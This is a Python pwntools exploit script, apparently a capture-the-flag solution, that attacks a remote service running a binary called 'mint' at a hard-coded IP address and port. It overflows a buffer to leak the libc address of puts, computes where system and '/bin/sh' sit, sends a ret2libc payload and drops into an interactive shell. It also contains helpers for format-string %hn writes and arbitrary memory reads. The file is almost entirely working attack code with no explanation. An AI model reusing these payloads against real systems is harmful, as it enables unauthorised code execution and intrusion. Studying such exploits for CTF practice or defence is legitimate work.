#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
elf=ELF('mint')
libc=ELF('libc-2.23.so')
def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)



def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        o2=o
        o=o+1
        lnom=lnom+[(w1,o1),(w2,o2)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(offset))+len(hn)
    finnom='A'*((8-(lg % 8)) % 8)
    lg=lg+len(finnom)
    indice=offset+(lg/4)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(indice+f[1])+hn
    nom=nom+finnom
    print nom
    return(nom)

def chaine(what,offset):
    nom0=""
    nom3=""
    w1=what & 0xffff
    w2 = what >> 16
    if (w1 <= w2):
        nom1=fmt(w1)+"%"
        o1=0
        nom2=fmt(w2-w1)+"%"
        o2=1
    else:
        nom1=fmt(w2)+"%"
        o1=1
        nom2=fmt(w1-w2)+"%"
        o2=0
        # nom1 offset1 hn offset2 nom2 hn nom4 adr1 adr2
    hn="$hn"
    lg=len(nom1)+len(nom2)+len(hn)+len(hn)+2*len(str(offset))
    nom4='A'*((8-(lg % 8)) % 8)
    lg=lg+len(nom4)
    indice=offset+(lg/4)
    nom =nom1+str(indice+o1)+hn+nom2+str(indice+o2)+hn+nom4
    print nom
    return(nom)

def lireoffset(i):
    p.send("%"+str(i)+"$08x"+"\n")
    s=p.recvuntil("\n")
    return(int(s[5:],16))


def boucle(s):
#    print "boucle sur ",s
    p.send(s+"\n")
    buf=p.recvuntil("\n")
#    print buf
    iadr=buf.index("Helo ")+5
    p.send(chaineretour)
    p.close()
    return(buf[iadr:])

def getzone(a):
    p=remote(host,port)
    p.sendline("%9$s"+"@@@@"+p32(a))
    time.sleep(TIME)
    b=p.recvuntil("@@@@")
    dump(a,b[5:]+"\x00")
    return(b[5:])

def ecrire(quoi,ou):
    boucle(chaine(quoi,12)+p32(ou)+p32(ou+2))


host="139.59.61.220"
port=42345
#host="localhost"
TIME=0.02
#port=1234
p=remote(host,port)

# 1 déclenchement
time.sleep(TIME)
p.recvuntil(":")
p.sendline("1")
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.recvuntil(":")
p.sendline("3")
b=p.recvuntil(":")
print b
p.sendline("2")
p.sendline("1")
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+p32(elf.plt['puts'])+p32(0x080483dd)+p32(elf.got['puts'])+p32(0x8048776))
print p.recvuntil(":")
p.sendline("3")
b=p.recvuntil(":")
p.sendline("4")
b=p.recvuntil(":")
libc_puts=word(b[0:4])

libc_system=libc.sym['system']-libc.sym['puts']+libc_puts
libc_binsh=libc.data.index("/bin/sh\x00")-libc.sym['puts']+libc_puts

p.sendline("1")
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.recvuntil(":")
p.sendline("3")
b=p.recvuntil(":")
print b
p.sendline("2")
p.sendline("1")
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+p32(libc_system)+p32(0x80483dd)+p32(libc_binsh)+p32(0x8048776))
print p.recvuntil(":")
p.sendline("3")
b=p.recvuntil(":")
p.sendline("4")
p.interactive()
b=p.recvuntil(":")

p.close()
